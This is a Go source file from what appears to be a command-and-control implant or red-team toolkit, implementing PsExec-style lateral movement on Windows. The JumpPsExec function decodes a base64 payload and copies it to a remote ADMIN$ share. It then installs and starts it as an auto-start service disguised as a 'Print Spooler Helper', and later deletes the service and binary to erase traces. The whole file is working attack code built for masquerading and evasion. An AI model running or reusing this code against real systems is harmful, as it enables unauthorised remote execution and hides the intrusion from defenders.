package execution


import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)[:n]
}

func copyFile(src, dst string) error {
	srcPtr, _ := syscall.UTF16PtrFromString(src)
	dstPtr, _ := syscall.UTF16PtrFromString(dst)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	copyFileW := kernel32.NewProc("CopyFileW")

	// CopyFileW(lpExistingFileName, lpNewFileName, bFailIfExists)
	// bFailIfExists = 0 means overwrite existing file
	r1, _, err := copyFileW.Call(
		uintptr(unsafe.Pointer(srcPtr)),
		uintptr(unsafe.Pointer(dstPtr)),
		uintptr(0), // Overwrite existing file
	)
	if r1 == 0 {
		return fmt.Errorf("CopyFileW failed: %w", err)
	}
	return nil
}

func deleteRemoteFile(path string) error {
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	deleteFile := kernel32.NewProc("DeleteFileW")

	r1, _, err := deleteFile.Call(uintptr(unsafe.Pointer(pathPtr)))
	if r1 == 0 {
		return fmt.Errorf("DeleteFileW failed: %w", err)
	}
	return nil
}

func scheduleCleanup(server, binPath, serviceName string) {
	go func() {
		time.Sleep(5 * time.Minute)

		// Connect to remote service manager
		m, err := mgr.ConnectRemote(server)
		if err != nil {
			return
		}
		defer m.Disconnect()

		// Open service
		s, err := m.OpenService(serviceName)
		if err != nil {
			// Service might be already deleted, just remove binary
			fullPath := fmt.Sprintf(`\\%s\ADMIN$\%s`, server, filepath.Base(binPath))
			deleteRemoteFile(fullPath)
			return
		}
		defer s.Close()

		// Stop service if running
		status, err := s.Query()
		if err == nil && status.State != windows.SERVICE_STOPPED {
			s.Control(windows.SERVICE_CONTROL_STOP)
			time.Sleep(2 * time.Second)
		}

		// Delete service
		s.Delete()

		// Delete binary
		fullPath := fmt.Sprintf(`\\%s\ADMIN$\%s`, server, filepath.Base(binPath))
		deleteRemoteFile(fullPath)
	}()
}

func JumpPsExec(encodedSrcFile, server string) string {
	serviceName := "SpoolerSvc_" + randomHex(6)
	binName := serviceName + ".exe"

	// Decode payload
	decodedData, err := base64.StdEncoding.DecodeString(encodedSrcFile)
	if err != nil {
		return fmt.Sprintf("[!] Decode failed: %v", err)
	}

	// Write to temp file
	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = "C:\\Windows\\Temp"
	}
	localFile := filepath.Join(tempDir, fmt.Sprintf("msedge_%d.exe", time.Now().UnixNano()))
	if err := os.WriteFile(localFile, decodedData, 0644); err != nil {
		return fmt.Sprintf("[!] Temp file write failed: %v", err)
	}
	defer os.Remove(localFile)

	// Copy file via Windows API
	remoteBinPath := fmt.Sprintf(`\\%s\ADMIN$\%s`, server, binName)
	if err := copyFile(localFile, remoteBinPath); err != nil {
		return fmt.Sprintf("[!] Copy failed: %v", err)
	}

	// Service installation
	m, err := mgr.ConnectRemote(server)
	if err != nil {
		return fmt.Sprintf("[!] SC connect failed: %v", err)
	}
	defer m.Disconnect()

	// Create service
	servicePath := `C:\Windows\` + binName
	s, err := m.CreateService(
		serviceName,
		servicePath,
		mgr.Config{
			StartType:   mgr.StartAutomatic,
			DisplayName: "Print Spooler Helper",
			Description: "Manages printer spooling operations",
		},
	)
	if err != nil {
		return fmt.Sprintf("[!] Service create failed: %v", err)
	}
	defer s.Close()

	// Start service
	if err := s.Start(); err != nil {
		return fmt.Sprintf("[!] Service start failed: %v", err)
	}

	// Schedule cleanup
	scheduleCleanup(server, servicePath, serviceName)

	return fmt.Sprintf("[+] PsExec completed on %s (service: %s)", server, serviceName)
}

